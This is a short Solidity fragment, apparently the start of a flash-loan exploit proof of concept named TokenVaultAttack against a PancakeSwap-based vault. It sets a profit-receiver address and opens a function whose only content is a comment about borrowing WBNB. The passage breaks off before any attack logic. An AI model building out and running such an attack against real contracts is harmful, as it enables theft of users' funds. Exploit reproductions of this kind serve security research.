contract TokenVaultAttack is IPancakeCallee {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external {
        // step 4: borrow WBNB from the Pancake pair and enter pancakeCall.
